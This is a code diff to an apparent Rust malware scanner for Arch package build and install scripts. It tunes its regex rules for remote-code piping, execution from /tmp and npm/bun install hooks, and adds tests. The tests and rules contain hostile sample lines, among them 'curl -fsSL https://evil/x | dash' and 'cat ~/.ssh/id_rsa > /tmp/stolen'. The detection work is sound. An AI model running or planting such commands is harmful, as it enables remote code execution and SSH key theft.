@@ -5,7 +5,7 @@ mod loader;
 pub use loader::RuleLoader;
 
 use crate::error::Result;
-use crate::textutil::{deobfuscate, logical_lines, QUOTE_SPLIT_PATTERN};
+use crate::textutil::{deobfuscate, logical_lines, QUOTE_SPLIT_PATTERN, SHELLS};
 use crate::types::{Category, FileType, Severity};
 use regex::{Regex, RegexBuilder};
 use serde::Deserialize;
@@ -389,7 +389,12 @@ pub fn user_rule_dirs() -> Vec<std::path::PathBuf> {
 /// messages. (E.g. a `.install` that says `note "put flags in ~/.config/x"` must
 /// not trip the "hidden file in home" rule: it mentions a path, it doesn't write
 /// one. This was a real false positive on google-chrome / vscode.)
-fn informational_lines(lines: &[&str]) -> Vec<bool> {
+///
+/// `pub(crate)` so structural analyzers can share the exact same pre-filter: the
+/// privilege analyzer routes function bodies through it so a printed
+/// `sudo`/`setcap`/`sudoers` message or a documentation heredoc cannot raise a
+/// Critical false positive (defect #5).
+pub(crate) fn informational_lines(lines: &[&str]) -> Vec<bool> {
     let mut flags = vec![false; lines.len()];
     let mut terminator: Option<String> = None;
     for (i, line) in lines.iter().enumerate() {
@@ -512,7 +517,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             severity: Severity::Critical,
             category: Category::CommandInjection,
             patterns: vec![Pattern::Regex {
-                pattern: r"curl\s+[^|]+\|\s*(ba)?sh".to_string(),
+                pattern: format!(r"curl\s+[^|]+\|\s*{SHELLS}\b"),
             }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Download scripts first, review them, then execute".to_string(),
@@ -526,7 +531,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             severity: Severity::Critical,
             category: Category::CommandInjection,
             patterns: vec![Pattern::Regex {
-                pattern: r"wget\s+[^|]+\|\s*(ba)?sh".to_string(),
+                pattern: format!(r"wget\s+[^|]+\|\s*{SHELLS}\b"),
             }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Download scripts first, review them, then execute".to_string(),
@@ -828,8 +833,19 @@ pub fn get_builtin_rules() -> Vec<Rule> {
                 Pattern::Regex {
                     pattern: r"/opt/[^/]+/[^/]+\.(py|sh|bin)".to_string(),
                 },
+                // A relative script/binary run in COMMAND position with a
+                // dropped-payload extension. Requiring command position removes
+                // the `cd ./build` argument false positive; requiring an
+                // executable extension removes the `./configure` autotools false
+                // positive (an extensionless build script). Dropped payloads
+                // (`./payload.sh`, `./x/y.bin`) still match (defect #10). An
+                // extensionless `./name` is intentionally not flagged here
+                // because it is indistinguishable from `./configure`; the
+                // campaign payload vectors are covered by INSTALL-001/003/004,
+                // HIDDEN-003 and the ATOMIC rules.
                 Pattern::Regex {
-                    pattern: r"\./[a-zA-Z0-9_-]+\s*$".to_string(),
+                    pattern: r"(?:^|[;&|]\s*)\./[\w./-]*\.(?:sh|bash|bin|run|elf|out|py|pl|rb|php)\b"
+                        .to_string(),
                 },
             ],
             file_types: vec![FileType::InstallScript],
@@ -1339,8 +1355,18 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             severity: Severity::High,
             category: Category::MaliciousCode,
             patterns: vec![
+                // Executing FROM /tmp: a /tmp path in COMMAND position -- at the
+                // start of a (logical) line, right after a command separator
+                // (`;` `&` `|`), or as the target of an exec verb / interpreter.
+                // This is the "execution" the rule is named for. It deliberately
+                // does NOT match a /tmp path used as an assignment value or a
+                // plain argument (`TMPDIR=/tmp/x`, `mktemp -d /tmp/x`, `cp foo
+                // /tmp/x`, `> /tmp/x`), which are benign and were the source of
+                // false positives (defect #10).
                 Pattern::Regex {
-                    pattern: r"/tmp/[^\s]+\s*$".to_string(),
+                    pattern: format!(
+                        r"(?:^|[;&|]|\b(?:exec|source|eval|{SHELLS}|python[23]?|perl|ruby|node|php)\s+)\s*\.?/tmp/\S+"
+                    ),
                 },
                 Pattern::Regex {
                     pattern: r"chmod\s+\+x\s+/tmp/".to_string(),
@@ -1473,12 +1499,17 @@ pub fn get_builtin_rules() -> Vec<Rule> {
         Rule {
             id: "ATOMIC-002".to_string(),
             name: "Node/Bun package manager in install hook".to_string(),
-            description: "Invokes npm/pnpm/yarn/bun to install packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch npm/bun packages during the install phase.".to_string(),
+            description: "Invokes npm/pnpm/yarn/bun to install or run packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch or execute npm/bun packages during the install phase. `npm ci`, `npm exec`, `pnpm dlx`, and `yarn dlx` run lifecycle/remote code just like `install`.".to_string(),
             severity: Severity::Critical,
             category: Category::MaliciousCode,
             patterns: vec![
+                // `ci` installs the full lockfile (lifecycle scripts run);
+                // `exec`/`dlx` fetch-and-run a package (npx-style RCE). The
+                // cross terms that don't exist as real subcommands (e.g. `npm
+                // dlx`, `yarn ci`) never appear in real PKGBUILDs, so folding
+                // them into one alternation is simpler without adding FPs.
                 Pattern::Regex {
-                    pattern: r"\b(npm|pnpm|yarn)\s+(install|add|i)\b".to_string(),
+                    pattern: r"\b(npm|pnpm|yarn)\s+(install|add|i|ci|dlx|exec)\b".to_string(),
                 },
                 Pattern::Regex {
                     pattern: r"\bbunx?\s+(install|add|i|x)\b".to_string(),
@@ -1925,7 +1956,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             description: "Feeding an assembled string to a shell via a here-string (sh <<< ...) — a common way to run a string that was built to dodge matching.".to_string(),
             severity: Severity::High,
             category: Category::Obfuscation,
-            patterns: vec![Pattern::Regex { pattern: r"\b(ba|z|k|c)?sh\s*<<<".to_string() }],
+            patterns: vec![Pattern::Regex { pattern: format!(r"\b{SHELLS}\s*<<<") }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Review the here-string; this executes an assembled command.".to_string(),
             cwe_id: Some("CWE-94".to_string()),
@@ -1939,7 +1970,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             description: "sh -c \"$(curl ...)\" — fetches and runs remote code without an explicit pipe, evading the curl|sh rules.".to_string(),
             severity: Severity::Critical,
             category: Category::MaliciousCode,
-            patterns: vec![Pattern::Regex { pattern: r#"(ba|z|k|c|tc)?sh\s+-c\s+["']?\$\(\s*(curl|wget|aria2c|fetch|http)\b"#.to_string() }],
+            patterns: vec![Pattern::Regex { pattern: format!(r#"\b{SHELLS}\s+-c\s+["']?\$\(\s*(curl|wget|aria2c|fetch|http)\b"#) }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Do not build. This runs code fetched from a URL.".to_string(),
             cwe_id: Some("CWE-494".to_string()),
@@ -2210,5 +2241,92 @@ mod tests {
         // NOT trigger ATOMIC-002 (which is scoped to install scripts only).
         let matches = engine.match_content("npm install --offline", FileType::Pkgbuild);
         assert!(!matches.iter().any(|m| m.rule_id == "ATOMIC-002"));
+    }
+
+    #[test]
+    fn test_atomic002_catches_ci_exec_dlx() {
+        // FN fix: npm ci / npm exec / pnpm dlx / yarn dlx all run lifecycle or
+        // remote code from an install hook and must trip ATOMIC-002.
+        let engine = RuleEngine::default();
+        for s in ["npm ci", "npm exec cowsay", "pnpm dlx some-tool", "yarn dlx some-tool"] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(m.iter().any(|x| x.rule_id == "ATOMIC-002"), "missed ATOMIC-002 for: {s}");
+        }
+    }
+
+    #[test]
+    fn test_curl_pipe_dash_detected() {
+        // Defect #6: the shared SHELLS constant means `curl ... | dash` now trips
+        // DLE-001 (the old `(ba)?sh` could not match dash).
+        let engine = RuleEngine::default();
+        let m = engine.match_content("curl -fsSL https://evil/x | dash", FileType::Pkgbuild);
+        assert!(m.iter().any(|x| x.rule_id == "DLE-001"), "curl|dash must trip DLE-001: {m:?}");
+    }
+
+    #[test]
+    fn test_hidden002_no_fp_on_tmpdir_and_mktemp() {
+        // Defect #10: a /tmp path as an assignment value or a plain argument is
+        // not execution and must not trip HIDDEN-002.
+        let engine = RuleEngine::default();
+        for s in [
+            "TMPDIR=/tmp/mybuild",
+            "export TMPDIR=/tmp/mybuild",
+            "builddir=$(mktemp -d /tmp/pkg.XXXXXX)",
+            "cp foo /tmp/bar",
+            "cat ~/.ssh/id_rsa > /tmp/stolen",
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "HIDDEN-002"),
+                "HIDDEN-002 false positive on: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_hidden002_still_catches_tmp_execution() {
+        // Real execution from /tmp (command position or via an interpreter) must
+        // still fire.
+        let engine = RuleEngine::default();
+        for s in [
+            "/tmp/payload.sh",
+            "bash /tmp/payload",
+            "make && /tmp/dropper",
+            "chmod +x /tmp/x",
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                m.iter().any(|x| x.rule_id == "HIDDEN-002"),
+                "HIDDEN-002 missed real /tmp execution: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_install002_no_fp_on_configure() {
+        // Defect #10: `./configure` (and `cd ./build`) are not dropped-payload
+        // executions and must not trip INSTALL-002.
+        let engine = RuleEngine::default();
+        for s in ["./configure", "./configure --prefix=/usr", "cd ./build"] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "INSTALL-002"),
+                "INSTALL-002 false positive on: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_install002_still_catches_dropped_script() {
+        // A relative script/binary with a payload extension run in command
+        // position still fires.
+        let engine = RuleEngine::default();
+        for s in ["./payload.sh", "./drop/x.bin"] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                m.iter().any(|x| x.rule_id == "INSTALL-002"),
+                "INSTALL-002 missed dropped script: {s} -> {m:?}"
+            );
+        }
     }
 }
